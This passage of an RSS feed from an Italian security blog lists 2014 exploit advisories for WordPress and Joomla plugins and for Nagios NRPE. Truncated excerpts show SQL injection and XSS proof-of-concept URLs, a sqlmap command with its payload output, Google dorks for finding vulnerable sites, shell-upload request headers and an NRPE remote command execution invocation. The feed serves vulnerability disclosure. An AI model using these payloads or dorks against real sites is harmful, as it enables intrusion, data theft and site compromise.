+      <description>$$$$$\ $$\ $$$$$$\ $$\ $$\\__$$ | $$ | $$ __$$\ \__| $$ |$$ | $$$$$$\ $$$$$$\ $$$$$$\$$$$\ $$ | $$$$$$\ $$ / \__| $$$$$$\ $$\ $$$$$$$ | $$$$$$\ $$$$$$\$$ |$$ __$$\ $$ __$$\ $$ _$$ _$$\ $$ | \____$$\ \$$$$$$\ $$ __$$\ $$ |$$ __$$ |$$ __$$\ $$ __$$\$$\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \____$$\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \__|$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\$$$$$$ |\$$$$$$ |\$$$$$$ |$$ | $$ | $$ |$$ |\$$$$$$$ | \$$$$$$ |$$$$$$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$ |\______/ \______/ \______/ \__| \__| \__|\__| \_______| \______/ $$ ____/ \__| \_______| \_______|\__|$$ |$$ |\__|$$$$$$\ $$\ $$\ $$\ $$$$$$\ $$$$$$\$$ __$$\ $$ | $$ | $$$$ | $$ ___$$\ $$ __$$\$$ / \__| $$$$$$\ $$$$$$$\ $$$$$$\ $$$$$$\ $$$$$$$\ $$$$$$\ $$$$$$$\ \_$$ | \_/ $$ | $$ / \__|$$ | $$ __$$\ $$ __$$\_$$ _| \____$$\ $$ _____|\_$$ _| $$ _____| $$ | $$$$$ / $$$$$$$\$$ | $$ / $$ |$$ | $$ | $$ | $$$$$$$ |$$ / $$ | \$$$$$$\ $$ | \___$$\ $$ __$$\$$ | $$\ $$ | $$ |$$ | $$ | $$ |$$\ $$ __$$ |$$ | $$ |$$\ \____$$\ $$ | $$\ $$ | $$ / $$ |\$$$$$$ |\$$$$$$ |$$ | $$ | \$$$$ |\$$$$$$$ |\$$$$$$$\ \$$$$ |$$$$$$$ | $$$$$$\ $$\$$$$$$ |$$\ $$$$$$ |\______/ \______/ \__| \__| \____/ \_______| \_______| \____/ \_______/ \______|\__|\______/ \__|\______/j00ml4 Spid3r C0nt4cts &amp;lt;= 1.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider Calendar 3.2.6 SQL Injection Exploit &#43; Demo</title>
+      <link>https://www.homelab.it/index.php/2014/09/06/joomla-spider-calendar-3-2-6-sql-injection-vulnerability/</link>
+      <pubDate>Sat, 06 Sep 2014 09:16:25 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/06/joomla-spider-calendar-3-2-6-sql-injection-vulnerability/</guid>
+      <description>$$$$$\ $$\ $$$$$$\ $$\ $$\\__$$ | $$ | $$ __$$\ \__| $$ |$$ | $$$$$$\ $$$$$$\ $$$$$$\$$$$\ $$ | $$$$$$\ $$ / \__| $$$$$$\ $$\ $$$$$$$ | $$$$$$\ $$$$$$\$$ |$$ __$$\ $$ __$$\ $$ _$$ _$$\ $$ | \____$$\ \$$$$$$\ $$ __$$\ $$ |$$ __$$ |$$ __$$\ $$ __$$\$$\ $$ |$$ / $$ |$$ / $$ |$$ / $$ / $$ |$$ | $$$$$$$ | \____$$\ $$ / $$ |$$ |$$ / $$ |$$$$$$$$ |$$ | \__|$$ | $$ |$$ | $$ |$$ | $$ |$$ | $$ | $$ |$$ |$$ __$$ | $$\ $$ |$$ | $$ |$$ |$$ | $$ |$$ ____|$$ |\$$$$$$ |\$$$$$$ |\$$$$$$ |$$ | $$ | $$ |$$ |\$$$$$$$ | \$$$$$$ |$$$$$$$ |$$ |\$$$$$$$ |\$$$$$$$\ $$ |\______/ \______/ \______/ \__| \__| \__|\__| \_______| \______/ $$ ____/ \__| \_______| \_______|\__|$$ |$$ |\__|$$$$$$\ $$\ $$\ $$$$$$\ $$$$$$\ $$$$$$\$$ __$$\ $$ | $$ | $$ ___$$\ $$ __$$\ $$ __$$\$$ / \__| $$$$$$\ $$ | $$$$$$\ $$$$$$$\ $$$$$$$ | $$$$$$\ $$$$$$\ \_/ $$ | \__/ $$ | $$ / \__|$$ | \____$$\ $$ |$$ __$$\ $$ __$$\ $$ __$$ | \____$$\ $$ __$$\ $$$$$ / $$$$$$ | $$$$$$$\$$ | $$$$$$$ |$$ |$$$$$$$$ |$$ | $$ |$$ / $$ | $$$$$$$ |$$ | \__| \___$$\ $$ ____/ $$ __$$\$$ | $$\ $$ __$$ |$$ |$$ ____|$$ | $$ |$$ | $$ |$$ __$$ |$$ | $$\ $$ | $$ | $$ / $$ |\$$$$$$ |\$$$$$$$ |$$ |\$$$$$$$\ $$ | $$ |\$$$$$$$ |\$$$$$$$ |$$ | \$$$$$$ |$$\ $$$$$$$$\ $$\ $$$$$$ |\______/ \_______|\__| \_______|\__| \__| \_______| \_______|\__| \______/ \__|\________|\__|\______/j00ml4 Spid3r C4l3nd4r &amp;gt;= 2.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Spider Facebook 1.0.8 Authenticated SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/09/05/wordpress-spider-facebook-1-0-8-authenticated-sql-injection/</link>
+      <pubDate>Fri, 05 Sep 2014 14:48:40 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/05/wordpress-spider-facebook-1-0-8-authenticated-sql-injection/</guid>
+      <description>####################### Exploit Title : WordPress Spider Facebook 1.0.8 Authenticated SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://web-dorado.com/# Software Link : http://downloads.wordpress.org/plugin/spider-facebook.1.0.8.zip# Date : 2014-08-25# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Linux / sqlmap 1.0-dev-5b2ded0####################### Location : http://localhost/wp-content/plugins/plugins/spider-facebook/facebook.php####################### Vulnerable code :function Spider_Facebook_manage(){require_once(&amp;#34;facebook_manager.php&amp;#34;);require_once(&amp;#34;facbook_manager.html.php&amp;#34;);if(!function_exists (&amp;#39;print_html_nav&amp;#39; ))require_once(&amp;#34;nav_function/nav_html_func.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Huge-IT Image Gallery 1.0.1 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/09/02/wordpress-huge-it-image-gallery-1-0-1-sql-injection/</link>
+      <pubDate>Mon, 01 Sep 2014 22:07:22 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/02/wordpress-huge-it-image-gallery-1-0-1-sql-injection/</guid>
+      <description>####################### Exploit Title : WordPress Huge-IT Image Gallery 1.0.1 Authenticated SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://huge-it.com/# Software Link : http://downloads.wordpress.org/plugin/gallery-images.zip (Fixed)Mirror Link : https://mega.co.nz/#!3EoUzSQI!yrl75XQsp1ggxDCjW-wq7yUxLdbLu0WHPNFcJAxJOHs# Date : 2014-08-25# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Linux / sqlmap 1.0-dev-5b2ded0####################### Location : http://localhost/wp-content/plugins/gallery-images/admin/gallery_func.php####################### Vulnerable code :function editgallery($id){global $wpdb;if(isset($_GET[&amp;#34;removeslide&amp;#34;])){if($_GET[&amp;#34;removeslide&amp;#34;] !</description>
+    </item>
+    
+    <item>
+      <title>WordPress Slideshow Gallery 1.4.6 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/09/01/wordpress-slideshow-gallery-1-4-6-shell-upload-vulnerability/</link>
+      <pubDate>Mon, 01 Sep 2014 21:04:05 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/09/01/wordpress-slideshow-gallery-1-4-6-shell-upload-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Slideshow Gallery 1.4.6 Shell Upload Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://tribulant.com# Software Link : http://downloads.wordpress.org/plugin/slideshow-gallery.1.4.6.zip# Date : 2014-08-09# Tested on : Windows 7 / Mozilla Firefox####################### Description : Any user could upload php files (administrator by default).####################### Locationhttp://127.0.0.1/wp-content/plugins/slideshow-gallery/views/admin/slides/save.php####################### PoC Exploit:POSTHost=127.0.0.1User-Agent=Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.</description>
+    </item>
+    
+    <item>
+      <title>NRPE 2.15 Remote Command Execution Exploit</title>
+      <link>https://www.homelab.it/index.php/2014/08/28/nrpe-2-15-remote-command-execution-exploit/</link>
+      <pubDate>Thu, 28 Aug 2014 20:48:38 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/28/nrpe-2-15-remote-command-execution-exploit/</guid>
+      <description>NRPE 2.15 Remote Command Execution python Exploit – CVE-2014-2913
+Download Exploit: HERE
+Custom Command Mode: claudio@backbox3:~/Desktop$ ./nrpe_215_rce_exploit.py -H 10.0.0.70 --cmd=&amp;#34;id&amp;#34; -c check_users$$\ $$\ $$$$$$$\ $$$$$$$\ $$$$$$$$\ $$$$$$\ $$\ $$$$$$$\$$$\ $$ |$$ __$$\ $$ __$$\ $$ _____| $$ __$$\ $$$$ | $$ ____|$$$$\ $$ |$$ | $$ |$$ | $$ |$$ | \__/ $$ | \_$$ | $$ |$$ $$\$$ |$$$$$$$ |$$$$$$$ |$$$$$\ $$$$$$ | $$ | $$$$$$$\$$ \$$$$ |$$ __$$&amp;lt; $$ ____/ $$ __| $$ ____/ $$ | \_____$$\$$ |\$$$ |$$ | $$ |$$ | $$ | $$ | $$ | $$\ $$ |$$ | \$$ |$$ | $$ |$$ | $$$$$$$$\ $$$$$$$$\ $$\ $$$$$$\$$$$$$ |\__| \__|\__| \__|\__| \________| \________|\__|\______|\______/$$$$$$$\ $$$$$$\ $$$$$$$$\$$ __$$\ $$ __$$\ $$ _____|$$ | $$ |$$ / \__|$$ |$$$$$$$ |$$ | $$$$$\$$ __$$&amp;lt; $$ | $$ __|$$ | $$ |$$ | $$\ $$ |$$ | $$ |\$$$$$$ |$$$$$$$$\\__| \__| \______/ \________|NRPE &amp;lt;= 2.</description>
+    </item>
+    
+    <item>
+      <title>Joomla Spider video player 2.8.3 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/08/26/joomla-spider-video-player-2-8-3-sql-injection/</link>
+      <pubDate>Tue, 26 Aug 2014 18:41:55 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/26/joomla-spider-video-player-2-8-3-sql-injection/</guid>
+      <description>####################### Exploit Title : Joomla Spider video player 2.8.3 SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://web-dorado.com/# Software Link : http://extensions.joomla.org/extensions/multimedia/multimedia-players/video-players-a-gallery/22321# Dork Google: inurl:/component/spidervideoplayerinurl:option=com_spidervideoplayer # Date : 2014-08-26# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox####################### PoC Exploit:http://localhost/component/spidervideoplayer/?view=settings&amp;amp;format=row&amp;amp;typeselect=0&amp;amp;playlist=1,&amp;amp;theme=1&amp;#39;&amp;#34;theme&amp;#34; variable is not sanitized.#####################Discovered By : Claudio Vivianihttp://www.homelab.itinfo@homelab.ithomelabit@protonmail.chhttps://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress GB Gallery Slideshow 1.5 Authenticated SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/08/10/wordpress-gb-gallery-slideshow/</link>
+      <pubDate>Sun, 10 Aug 2014 13:20:45 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/10/wordpress-gb-gallery-slideshow/</guid>
+      <description>####################### Exploit Title : WordPress GB Gallery Slideshow 1.5 Authenticated SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://gb-plugins.com/# Software Link : http://downloads.wordpress.org/plugin/gb-gallery-slideshow.1.5.zip# Date : 2014-08-09# Tested on : Linux / sqlmap 1.0-dev-5b2ded0Linux / Mozilla Firefox####################### Location : http://localhost/wp-content/plugins/gb-gallery-slideshow/GBgallery.php####################### Vulnerable code :if(isset($_POST[&amp;#39;selected_group&amp;#39;])){global $gb_post_type, $gb_group_table, $wpdb;$my_group_id = $_POST[&amp;#39;selected_group&amp;#39;];$my_group = $wpdb-&amp;gt;get_results( &amp;#34;SELECT groups FROM $gb_group_table WHERE id = &amp;#34;.</description>
+    </item>
+    
+    <item>
+      <title>WordPress 3.x, 4.x Path Traversal &#43; Directory Listing &#43; File Deletion Vulnerabilities</title>
+      <link>https://www.homelab.it/index.php/2014/08/06/wordpress-3-4-vulnerabilities/</link>
+      <pubDate>Wed, 06 Aug 2014 21:25:44 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/06/wordpress-3-4-vulnerabilities/</guid>
+      <description>####################### Exploit Title : WordPress 3.x, 4.x Path Traversal + Directory Listing + File Deletion Vulnerabilities# Exploit Author : Claudio Viviani# Vendor Homepage : https://wordpress.org# Software Link : http://wordpress.org/wordpress-3.9.2.tar.gz# Date : 2014-07-11# Tested on : Mozilla Firefox / WordPress 4.0 beta 1# Mozilla Firefox / WordPress 4.0 beta 2# Mozilla Firefox / WordPress 4.0 beta 3# Mozilla Firefox / WordPress 3.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Gmedia Gallery 1.2.1 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/08/02/wordpress-gmedia-gallery-1-2-1-shell-upload-vulnerability/</link>
+      <pubDate>Sat, 02 Aug 2014 13:47:24 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/08/02/wordpress-gmedia-gallery-1-2-1-shell-upload-vulnerability/</guid>
+      <description>####################### Exploit Title : WordPress Gmedia Gallery 1.2.1 Shell Upload Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.codeasily.com/# Software Link : http://downloads.wordpress.org/plugin/grand-media.zip# Date : 2014-08-01# Tested on : Windows 7 / Mozilla Firefox####################### Description : Any authenticated user could upload php files (administrator by default).####################### Vulnerability Disclosure Timeline:2014-08-01: Discovered vulnerability2014-08-01: Vendor Notification (Twitter)2014-08-01: Vendor Response/Feedback 2014-08-02: Vendor Fix/Patch 2014-08-02: Public Disclosure ####################### PoC:POSTHost=127.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Slider Revolution &lt;= 4.1.4 Arbitrary File Download vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/07/28/wordpress-slider-revolution-arbitrary-file-download/</link>
+      <pubDate>Mon, 28 Jul 2014 17:30:03 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/28/wordpress-slider-revolution-arbitrary-file-download/</guid>
+      <description>####################### Exploit Title : WordPress Slider Revolution Responsive &amp;lt;= 4.1.4 Arbitrary File Download vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : http://codecanyon.net/item/slider-revolution-responsive-wordpress-plugin/2751380# Software Link : Premium plugin# Dork Google: revslider.php &amp;#34;index of&amp;#34;# Date : 2014-07-24# Tested on : Windows 7 / Mozilla FirefoxLinux / Mozilla Firefox####################### DescriptionWordpress Slider Revolution Responsive &amp;lt;= 4.1.4 suffers from Arbitrary File Download vulnerability####################### PoChttp://victim/wp-admin/admin-ajax.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Video Gallery 2.5 SQL Injection/XSS Vulnerabilities</title>
+      <link>https://www.homelab.it/index.php/2014/07/24/wordpress-video-gallery-vulnerabilities/</link>
+      <pubDate>Thu, 24 Jul 2014 17:13:00 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/24/wordpress-video-gallery-vulnerabilities/</guid>
+      <description>####################### Exploit Title : WordPress Video Gallery 2.5 SQL Injection and XSS Vulnerabilities# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.apptha.com/category/extension/Wordpress/Video-Gallery# Software Link : http://downloads.wordpress.org/plugin/contus-video-gallery.2.5.zip# Dork Google: inurl:/contus-video-gallery/hdflvplayer/hdplayer.swf(Click on &amp;#34;Repeat the search with the omitted results included&amp;#34;)# Date : 2014-07-15# Tested on : Windows 7 / Mozilla FirefoxWindows 7 / sqlmap (0.8-1)Linux / Mozilla FirefoxLinux / sqlmap 1.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Gallery Objects 0.4 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/07/18/wordpress-gallery-objects-0-4-sql-injection/</link>
+      <pubDate>Fri, 18 Jul 2014 17:35:22 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/18/wordpress-gallery-objects-0-4-sql-injection/</guid>
+      <description>####################### Exploit Title : WordPress Gallery Objects 0.4 SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://galleryobjects.com/# Software Link : http://downloads.wordpress.org/plugin/gallery-objects.0.4.zip# Dork Google: inurl:/admin-ajax.php?action=go_view_object # Date : 2014-07-18# Tested on : Windows 7 / Mozilla FirefoxWindows 7 / sqlmap (0.8-1)Linux / Mozilla FirefoxLinux / sqlmap 1.0-dev-5b2ded0######################Poc via Browser:http://VICTIM/wp-admin/admin-ajax.php?action=go_view_object&amp;amp;viewid=1[ and 1=2]&amp;amp;type=htmlsqlmap:sqlmap -u &amp;#34;http://VICTIM/wp-admin/admin-ajax.php?action=go_view_object&amp;amp;viewid=1&amp;amp;type=html&amp;#34; -p viewid---Place: GETParameter: viewidType: boolean-based blindTitle: AND boolean-based blind - WHERE or HAVING clausePayload: action=go_view_object&amp;amp;viewid=475 AND 7403=7403&amp;amp;type=html---#####################Discovered By : Claudio Vivianihttp://www.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Tidio Gallery 1.1 Shell Upload and XSS Vulnerabilities</title>
+      <link>https://www.homelab.it/index.php/2014/07/15/wordpress-tidio-gallery-1-1-vulnerabilities/</link>
+      <pubDate>Tue, 15 Jul 2014 17:32:49 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/15/wordpress-tidio-gallery-1-1-vulnerabilities/</guid>
+      <description>####################### Exploit Title : WordPress Tidio Gallery 1.1 Shell Upload and XSS Vulnerabilities# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.tidioelements.com/# Software Link : http://downloads.wordpress.org/plugin/tidio-gallery.zip# Date : 2014-07-14# Tested on : Windows 7 / Mozilla Firefox####################### Location : http://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-help.php -&amp;gt; XSShttp://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-post.php -&amp;gt; Upload Shell####################### Vulnerablity n°1:XSS Reflected Unauthenticatedhttp://VICTIM/wp-content/plugins/tidio-gallery/popup-insert-help.php?galleryId=&amp;#34;/&amp;gt;&amp;lt;script&amp;gt;alert(1);&amp;lt;/script&amp;gt;# Vulnerablity n°2:Unprivileged user like subscriber could upload shell script.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Download Manager 2.6.8 Shell Upload Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/07/12/wordpress-download-manager-2-6-8/</link>
+      <pubDate>Fri, 11 Jul 2014 23:31:02 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/12/wordpress-download-manager-2-6-8/</guid>
+      <description>####################### Exploit Title : WordPress Download Manager 2.6.8 Shell Upload Vulnerability# Exploit Author : Claudio Viviani# Vendor Homepage : www.wpdownloadmanager.com# Software Link : http://downloads.wordpress.org/plugin/download-manager.zip# Date : 2014-07-11# Tested on : Linux / Mozilla Firefox / WordPress Download Manager 2.6.8 Free Version# # # WORK ONLY ON SERVER WITH .HTACCESS FILES DISABLED####################### Location : http://IP_VICTIM/wp-content/plugins/download-manager/wpdm-add-new-file.php####################### Description :WordPress Download Manager 2.</description>
+    </item>
+    
+    <item>
+      <title>WordPress BSK PDF Manager 1.3.2 SQL Injection</title>
+      <link>https://www.homelab.it/index.php/2014/07/10/wordpress-bsk-pdf-manager-sqlinj/</link>
+      <pubDate>Wed, 09 Jul 2014 23:31:32 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/10/wordpress-bsk-pdf-manager-sqlinj/</guid>
+      <description>####################### Exploit Title : WordPress BSK PDF Manager 1.3.2 Authenticated SQL Injection# Exploit Author : Claudio Viviani# Vendor Homepage : http://www.bannersky.com/bsk-pdf-manager/# Software Link : http://downloads.wordpress.org/plugin/bsk-pdf-manager.zip# Date : 2014-07-04# Tested on : Windows 7 / Mozilla Firefox# Linux / Mozilla Firefox# Linux / sqlmap 1.0-dev-5b2ded0####################### Location : http://localhost/wp-content/plugins/compfight/compfight-search.php####################### Vulnerable code :[claudio@localhost ~]$ grep -R GET bsk-pdf-manager/bsk-pdf-manager/inc/bsk-pdf-dashboard.php: if(isset($_GET[&amp;#39;view&amp;#39;]) &amp;amp;&amp;amp; $_GET[&amp;#39;view&amp;#39;]){bsk-pdf-manager/inc/bsk-pdf-dashboard.</description>
+    </item>
+    
+    <item>
+      <title>WordPress Compfight &lt;= 1.4 Authenticated Reflected XSS Vulnerability</title>
+      <link>https://www.homelab.it/index.php/2014/07/03/wordpress-compfight-xss/</link>
+      <pubDate>Thu, 03 Jul 2014 20:04:28 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/07/03/wordpress-compfight-xss/</guid>
+      <description>####################### Exploit Title : WordPress Compfight 1.4 Authenticated Cross Site Scripting# Exploit Author : Claudio Viviani - HomeLab IT# Vendor Homepage : http://wordpress.org/plugins/easy-banners/# Software Link : http://downloads.wordpress.org/plugin/compfight.1.4.zip# Date : 2014-07-03# Tested on : Windows 7 / Mozilla Firefox####################### Location : http://localhost/wp-content/plugins/compfight/compfight-search.php####################### Vulnerable code :if (!$search_value) {$input_text = &amp;#39;Enter Keyword(s)&amp;#39;;} else {$input_text = $search_value;}if ($show_title) {$output .</description>
+    </item>
+    
+    <item>
+      <title>Nagios NRPE &lt;= 2.15 Remote Command Injection: Analisi, test e fix della vulnerabilità</title>
+      <link>https://www.homelab.it/index.php/2014/05/03/nagios-nrpe-remote-command-injection-test-fix/</link>
+      <pubDate>Sat, 03 May 2014 02:01:08 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/05/03/nagios-nrpe-remote-command-injection-test-fix/</guid>
+      <description>Informazioni generali Qualche giorno fa è stato scovato un bug sul noto monitor d’infrastrutture Nagios, più precisamente la vurnerabilità riguarda l’agent NRPE (Nagios Remote Plugin Executor).
+============================================= - Release date: 17.04.2014 - Discovered by: Dawid Golunski - Severity: High ============================================= CVE: 2014-2913
+Nrpe è un agent che viene installato su tutte le macchine monitorare da Nagios e a seconda delle varie personalizzazioni può restituire varie informazioni, come ad esempio lo stato del disco rigido, della memoria, la funzionalità o meno di determinati servizi ecc.</description>
+    </item>
+    
+    <item>
+      <title>Heartbleed VMware – Situazione di tutti i prodotti affetti dal bug</title>
+      <link>https://www.homelab.it/index.php/2014/04/13/heartbleed-situazione-dei-prodotti-vmware/</link>
+      <pubDate>Sun, 13 Apr 2014 17:36:47 +0000</pubDate>
+      
+      <guid>https://www.homelab.it/index.php/2014/04/13/heartbleed-situazione-dei-prodotti-vmware/</guid>
+      <description>Heartbleed VMware – Lista prodotti affetti dal bug: Quasi tutti i prodotti VMware rilasciati negli ultimi 2 anni utilizzano la libreria OpenSSL dalla versione 1.0.1 in poi.
+Gli ingegneri della software house sono a lavoro per trovare soluzioni opportune prodotto per prodotto, il link a cui fare riferimento è questo:
+Knowledge Base: 2076225 Updated: Apr 20, 2014
+I prodotti confermati affetti dal bug sono i seguenti:
+ ESXi 5.5 (for specific remediation details, see VMware Security Advisory VMSA-2014-0004) NSX for Multi-Hypervisor Manager 4.</description>
+    </item>
+    
+  </channel>
+</rss>
